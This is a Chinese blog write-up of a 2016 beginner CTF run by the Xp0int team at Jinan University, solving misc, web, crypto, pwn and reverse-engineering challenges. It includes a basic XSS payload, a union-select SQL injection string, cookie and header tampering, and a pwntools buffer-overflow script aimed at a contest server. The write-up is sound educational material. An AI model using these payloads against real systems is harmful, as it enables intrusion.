---
title: Xp0int新生杯交流赛Write up
date: 2016-10-20 13:30:24
categories: 技术
tags: 安全
---

为了招揽安全方向的新生，暨南大学Xp0int团队组织了[Xp0int2016新生杯交流赛](http://www.giantbranch.cn:8889)。

由于是民间团队，题目较基础，校内外大牛就不用来战了。

# Misc

## 签到题

> 规则，请提交flag{}括号里面的内容，如有问题请联系管理员
>
> 想知道  flag ，去微信公众号Xp0int问一问吧！

- flag{**Xp0int_123456789**}

## Xp0int-Stegano

> 这是Xp0int的图片，里面藏着信息，你能找到吗?[xp0.png](http://www.giantbranch.cn:8889/static/uploads/9b364da433574cf67557e2647e974b41/xp0.png)

基础的隐写术

- 另存为图片，用记事本打开，最后一段写了flag:**X-p0int122333**

## Xp0int-Change

> 一串奇怪的字符，你需要解开它隐藏的秘密\u002d\u0032\u003a\u0064\u0063\u0075\u0067\u0038\u0036\u005c\u006f\u007a\u006a\u005c\u007c\u0072\u0039\u0059\u004a\u0043\u0079\u0063\u0059\u0037\u0032\u004e\u0059\u0054\u006f\u0051\u0046\u0065\u0037\u0051\u004a\u004c\u003b

- 该编码为Unicode编码，所以解码一下得到`-2:dcug86\ozj\|r9YJCycY72NYToQFe7QJL;`

- 前面的**-2**是提示我们向前偏移2个字符，所以写个`.py`再解码就解决了

  ```python
  import base64
  str1='dcug86\ozj\|r9YJCycY72NYToQFe7QJL;'
  str2=''
  for x in str1:
  	str2+=chr(ord(x)-2)
  print base64.b64decode(str2[6:])
  ```

  直接输出flag:{**Xp0int-df8798r**}

## 隐写术

> 找找看flag在哪里？真的在DOC文件里吗？应该在？[flag.docx](http://www.giantbranch.cn:8889/static/uploads/86c78fe30ea4c60604e2b18632868ee2/flag.docx)

- 将文件后缀改为`.zip`（或者其他压缩格式）
- 打开`/word/document.xml`目录,`ctrl+f`搜索**flag**关键词，得到flag{**Xp0int_y0u_ar4_5o_clever**}

# Web

## where r u from

> 你是谁？你从哪里来？要到哪里去[http://pyzpyjy.cn/refer/](http://pyzpyjy.cn/refer/)

题目已经说的很清楚了`from http://baidu.com enter`

- 修改请求头**Referer**参数`Referer: http://baidu.com`得到flag:{**Xp0int-referer**} 

## xss

> 快输入点什么让它弹出flag吧[http://pyzpyjy.cn/xss/](http://pyzpyjy.cn/xss/)

非常基础的xss，未过滤`<script>`

- 直接在输入框输入`<script>alert(1)</script>`得到flag:{**Xp0int-xssinteresting**} 

<a id="getflag"></a>

## Get flag

> [http://123.207.1.235/ctf/getflag.php](http://123.207.1.235/ctf/getflag.php)

查看请求头后发现**Cookie**参数为`Cookie:flag=0`

- 很明显，直接修改`Cookie:flag=1`即可返回flag{**Xp0int_is_here**}

## 无脑前端

> 输入正确的验证码就可以拿到flag咯！很简单吧！[lwh-.html](http://www.giantbranch.cn:8889/static/uploads/d2b01d2bc2dbe29712d11839b927b19b/lwh-.html)

查看源代码发现`<head>`上面引用了`<script>`脚本

```javascript
function flag () {
	var point=document.getElementById("check").value;
	var flag="520";
		document.write(point);
	if(point==flag)
	{
		alert("ZmxhZyhYcDBpbnRBbm5vbW9yaXR5Sk5VKQo= (p.s.可以试一试base64解码)");
	}
	else
	{
		alert("输入有误");
	}
}
```

- 将`ZmxhZyhYcDBpbnRBbm5vbW9yaXR5Sk5VKQo=`**base64**解码即可获得flag(**Xp0intAnnomorityJNU**)，确实非常无脑

## PHP~

> 师兄师姐的话不要全信[http://www.lynnlinlin.cn/Xp0int/index.php](http://www.lynnlinlin.cn/Xp0int/index.php)

页面上显示`index.php.txt有毒，不要看！！`，明摆着让你看

查看index.php.txt显示如下**php**代码

```php
<?php 
if("Xp0int233" == $_GET[id])//$_GET 变量是一个数组，内容是由 HTTP GET 方法发送的变量名称和值。从带有 GET 方法的表单发送的信息会显示在浏览器的地址栏
{
    echo "<p>not allowed!</p>";
    exit();//退出
}
$_GET[id] = urldecode($_GET[id]);//urldecode函数将 URL 编码后字符串还原成未编码的样子。编码使用 %## 的格式。
if($_GET[id] == "Xp0int233")
{
    echo "<p>Congratulations!</p>";
    echo "<p>flag: *********</p>";
}
echo "<br><br>index.php.txt有毒，不要看！！";
?>
```

注释上已经说的很清楚了，id应该为`Xp0int233`的**url编码**，但是`urldecode()`会先将**url编码**解码再请求，所以要对`Xp0int233`的**url编码**再进行一次**url编码**

- 先将`Xp0int233`编码为`%58%70%30%69%6e%74%32%33%33`
- 再一次编码为`%25%35%38%25%37%30%25%33%30%25%36%39%25%36%65%25%37%34%25%33%32%25%33%33%25%33%33`
- 注入返回flag: {**Xp0int666666**}

## cookie

> [http://123.207.1.235/ctf/setcookie.php](http://123.207.1.235/ctf/setcookie.php)

与上面[Get flag](#getflag)相同方法

-  flag{**Xp0int_is_a_great_team**}

## JsFuck

> [http://123.207.1.235/ctf/jsfuck.html](http://123.207.1.235/ctf/jsfuck.html)

JSFuck 可以只用 6 个字符 `[]()!+` 来编写 JavaScript 程序，可起到一定加密作用。教程：[JsFuck教程](http://www.yiibai.com/t/jsfuck)

我们自己去解析这么大段JsFuck是不可能的，所以用到工具网站[http://www.jsfuck.com/](http://www.jsfuck.com/)

- 复制JsFuck代码到工具网站揭秘，得到flag{**Xp0int_welcomes_you**}

## Login Brute Force

> [http://pyzpyjy.cn/session/](http://pyzpyjy.cn/session/)

题目好像是在暗示爆破，然而并不是。链接显示题目与`session`有关（[session的工作原理](http://baike.baidu.com/link?url=qPUqIUT7mkR39IQO_ni8rWD3l_FvZOdGTrnNyNYtcsZoFOWwj_N00sDKuNVx7tH2jzVLIJqLrINnlxn8EPlju_)）

### 操作

- 先用扫描工具扫一遍，扫到有个`robots.txt`（[robots协议](http://baike.baidu.com/link?url=r8iXYNc1i5m6S7LADurl7UQBD5jUs-h6Gn8J6kHr0N025DE1_f5W9AZ3e8LqoUm224jBPU5J5IuusDSo-HsV8G0AIioI50TJjCCtrK81-WHohG6sNwJp4mKMITVaMUsJZ3EBuQ_n76Yd5XnN-kTIOq)），发现`/admin/`目录

- 进入`/admin/`显示`Please login first!`，所以知道这两个目录之间是靠`session`判断用户是否是登录状态

- 接着随便输入用户名、密码，并在弹窗期间进入`/admin/`，显示`Please login as admin!`

- 将用户名改为`admin`后再次尝试，得到flag{**Xp0int-wobeikengle**}

### 原理

- 弹出`error`后确认会跳转回登录页面，原来的`session`会被销毁，再去`admin`就会显示未登录
- 在没按确认的时候，session还没被销毁，此时进入`admin`就等于登陆状态进去的
    - `/admin/`目录只对**username**进行判断，并返回相应内容，并判断密码

### 类似功能的源码

```HTML
<html>
<head>
<title></title>
</head>
<body>
<form method="post" action="">
username:<input type="text" name="name"><br>
password:<input type="password" name="pwd"><br>
<input type="submit" value="login">
</form>
</body>
</html>
```

```php
<?php
session_start();
if($_SESSION['name'])
{
  if($_SESSION['name']=='admin')
  	echo "flag is 123";
  else
  	echo "Please login as admin!"
}
else
	echo "Please login first!";
?>
```

## 注注注

> 我希望你们守住（手注），好像sqlmap用不了的哦
>
> [get it](https://jctf2016-jncb.rhcloud.com/web200/)
>
> 降低难度，提交参数是id哦，别以为id=1就可以了，呵呵
>
> 若访问不了，请过几秒后刷新

提示`https://jctf2016-jncb.rhcloud.com/web200/?id=-1")%20union%20select%201,2,database()%23`



# Crypto

## Crypto1

> 这是一个有趣的密码
>
> Hint: 百度识图
>
> [http://pyzpyjy.cn/zhujuan/](http://pyzpyjy.cn/zhujuan/)

由链接名称得知可能是[猪圈密码](http://baike.baidu.com/link?url=nDBZkL3_IMy-dCi0Nbz6JNFYhwsh8wmirPAL5PbXM440uoyHEUVy2MHpCA_C44SkQgdJzcsSzNGb2E42NS1vHK)

- 对照密码表翻译出3张图片代表`zhu`，提交即返还flag:{**Xp0int-zhujuanmima**}

## Morse

> ..-. .-.. .- --.  -..- .--.  .. -. -  -- --- .-. ... .  -.-. --- -.. .  

[摩尔斯密码](http://baike.baidu.com/link?url=2_NqetlIpn73nuMbjvfcv_GqHCVNVOWEsyRE_LYhCAQqLAwo29HVdiEhqnF_KvhnMoXpV1eR82LeXRHMn58AvVP1j00F4FcoKQ2n2-5PGuNOCCAJ6nEFmMwQe-fL7ZmmT9SAQl_ylWAi5rfU_i5LeJc5DRpTiFuit-yXrhMLVA73foDXxUK4RrGDwnJjMeD_fYhXdZNPotNCbsOUqNcOeO1PNyxGDGWFQRvZDG2Q3wa)

- 对照密码表翻译即可得到`flagxpintmorsecode`

## 你猜

> ESZDCTF 852 IUHNM GHYTFVB

- 按照顺序在键盘上敲一边，其轨迹为**nice**

## GO

> 听说出题人喜欢吃夜宵食堂二楼的培根加蛋手抓饼！
>
> flag{BABAB ABBBA ABBAB ABAAA ABBAA BAABA AABBA ABBAB}
>
> 提交时无空格

[培根密码](http://baike.baidu.com/link?url=9ZQymTxKQoO09bgSyYikiuGme-gHmPWKIiB4N2sbXqYzAlP95C4RDli0lhPN9jJMRYR7VsmldIMv4-1ViD6kvaTp6eIe0zyg8Lzh_JvQ6rSgdYNOi2OZiKfHX0lFuQZQ)

- 对照第一种密码表翻译得到`vonimsgn`，无论大小写都错误
- 题目提示**食堂二楼的培根...**，因此对照第二种密码表翻译得到`xpointgo`或`xpojntgo`，都试一下就行了

## 搞那么多干嘛

> 搞起，这什么加密呢
>
> 什么，看不全?我故意的，不用你删除换行还怎么样,我相信你有办法获取
>
> JZVEKMS2IRJGYTL2IEYVSVC2NRHHUUJSLF5FE3CNPJETAWKULJVE4R2VGBHEIUTMJZVGWMKPKRKTGTSENMZU6VCWNBHG2RJQLJCE2MCOI5KTGWKUKV4E26SJGFMVIVJQJZWUS6SNKRJG2TSUKEYU4VCNPBHEOUJQJZCFK6KONJTTAWSUKEZU4R2RGNHUIVTIJZWVCMKOKRSGQTSHKUYE6RCNO5GTEUJ5

先**base32**转码，

```
4E6A45325A44526C4D7A413159545A6C4E7A5132597A526C4D7A493059545A6A4E4755304E44526C4E6A6B314F5455334E446B334F5456684E6D45305A444D304E475533595455784D7A4931595455304E6D497A4D54526D4E5451314E544D784E4751304E4455794E6A67305A5451334E4751334F4456684E6D51314E5464684E4755304F444D774D32513D
```

再**ASCII**转码，

```
NjE2ZDRlMzA1YTZlNzQ2YzRlMzI0YTZjNGU0NDRlNjk1OTU3NDk3OTVhNmE0ZDM0NGU3YTUxMzI1YTU0NmIzMTRmNTQ1NTMxNGQ0NDUyNjg0ZTQ3NGQ3ODVhNmQ1NTdhNGU0ODMwM2Q=
```

看到=标志进行**base64**转码，

```
616d4e305a6e746c4e324a6c4e444e69595749795a6a4d344e7a51325a546b314f5455314d4452684e474d785a6d557a4e48303d
```

再**ASCII**转码，
`amN0ZntlN2JlNDNiYWIyZjM4NzQ2ZTk1OTU1MDRhNGMxZmUzNH0=`
再**base64**转码，出flag
jctf{**e7be43bab2f38746e9595504a4c1fe34**}

***此题由brzhj25贡献***

## 666666

> flag 666666 0123
>
> [1.txt](http://www.giantbranch.cn:8889/static/uploads/1b5968c7b7019cac21744fa13f96fc90/1.txt)

官方脚本

```
# -*- coding:utf-8 -*-
#str1="fmcd]v7ag~TxwPi!gaKw\"dl8g"
str1='fmcd]v7ag~TxwPi!gaKw"dl8g'
str2=''
for x in xrange(len(str1)):
    str2+=chr(ord(str1[x])^x)

print str2
```

# pwn

> 直接下载看看吧
>
> nc 119.29.191.200 10100
>
> [pwn150](http://www.giantbranch.cn:8889/static/uploads/5bca2d0024f8e640440a07702761e291/pwn150)

官方脚本

```python
from pwn import *

# p = process("./pwn100")
p = remote("119.29.191.200", "10100")
ret = 0x4005E4
payload = "A" *136 + p64(ret)

p.send(payload)

p.interactive()
```

# Re

## 请输入flag

> Hit：尝试使用IDA，进行逆向，工具下载 请戳-->[http://down.52pojie.cn/Tools/Disassemblers/](http://down.52pojie.cn/Tools/Disassemblers/)
>
> [re100.zip](http://www.giantbranch.cn:8889/static/uploads/bb61c803306fca6b3688eb00644689ed/re100.zip)

做这道题的时候，刚刚看完王爽的《汇编语言》，但是没有怎么实战过。因为曾经网上看到 过一个别人的 writeup ，在一个逆向题里面的思路是通过函数找到字符串，继而找到 flag。 突然想着我也可以这么试试，回来用 IDA 打开程序，在函数窗口那里发现一个 strncmp 函 数，突然思路就来了。 

从程序的角度来说，打开程序后就叫你输入 flag，所以程序内部肯定有这么一个环节，是把 我们输入的字符串和它内部产生的正确的 flag 做一个比较，相同就返回正确的提示信息。所 以我只要程序运行之后，随便输入一个字符串，然后跳到 strncmp 函数处，跟随函数的执 行，应该就能发现正确的 flag。IDA 动态调试了一下，思路正确，得到 flag。 

flag:**we1c0_2_xp0int**

***此题由Plus贡献***

## first Android

> 破解大师，不要费劲心思破解了
>
> [crackme0001.apk](http://www.giantbranch.cn:8889/static/uploads/b4c16350eb72959ab3961361dddf0904/crackme0001.apk)

直接将apk拖进ApkIDE，全部文件搜索flag查到

```java
<string name="iamhere">看看flag在哪吧，我怎么认为最危险的地方就是最安全的地方呢</string>
<string name="j47f">jctf{y0u_le6rn_that}</string>
```

jctf{**y0u_le6rn_that**}

## Read ASM

>int main(int argc, char const *argv[])
>{
>  char input[] = {0x0,  0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c};
>  func(input, 28);
>  printf("%s\n",input+1);
>  return 0;
>}
>func函数的asm代码如下:
>00000000004004e6 :
>  4004e6: 55                    push   rbp
>  4004e7: 48 89 e5              mov    rbp,rsp
>  4004ea: 48 89 7d e8           mov    QWORD PTR [rbp-0x18],rdi
>  4004ee: 89 75 e4              mov    DWORD PTR [rbp-0x1c],esi
>  4004f1: c7 45 fc 01 00 00 00  mov    DWORD PTR [rbp-0x4],0x1
>  4004f8: eb 28                 jmp    400522 
>  4004fa: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]
>  4004fd: 48 63 d0              movsxd rdx,eax
>  400500: 48 8b 45 e8           mov    rax,QWORD PTR [rbp-0x18]
>  400504: 48 01 d0              add    rax,rdx
>  400507: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]
>  40050a: 48 63 ca              movsxd rcx,edx
>  40050d: 48 8b 55 e8           mov    rdx,QWORD PTR [rbp-0x18]
>  400511: 48 01 ca              add    rdx,rcx
>  400514: 0f b6 0a              movzx  ecx,BYTE PTR [rdx]
>  400517: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]
>  40051a: 31 ca                 xor    edx,ecx
>  40051c: 88 10                 mov    BYTE PTR [rax],dl
>  40051e: 83 45 fc 01           add    DWORD PTR [rbp-0x4],0x1
>  400522: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]
>  400525: 3b 45 e4              cmp    eax,DWORD PTR [rbp-0x1c]
>  400528: 7e d0                 jle    4004fa 
>  40052a: 90                    nop
>  40052b: 5d                    pop    rbp
>  40052c: c3                    ret              

主要就是要读懂汇编码= =，没啥好说的，放一下func的源程序，

```c
void func(char input[],int num)
{
	int i = 1;
	while(i <= num)
	{
		*(input[0]+i) ^= i; 
		i++;
	}
}
```

跑一下出结果：
flag{**read_asm_is_the_basic**}

***此题由brzhj25贡献***

## 抛骰子

> 好玩的抛骰子游戏，大家快来玩啊！
>
> [http://pan.baidu.com/s/1slTHxcp](http://pan.baidu.com/s/1slTHxcp)

下载下来放进OD里，运行发现只有每次准确扔出特定的点数，程序才会进行下一步操作，否则退出。在每一次程序作出判断前下断，将跳转到失败代码处的汇编语句改掉，如jz改为jnz，重复几次后出结果。
flag{**9a9689dbd47a1fd3fc0bf17d60edf545**}

***此题由brzhj25贡献***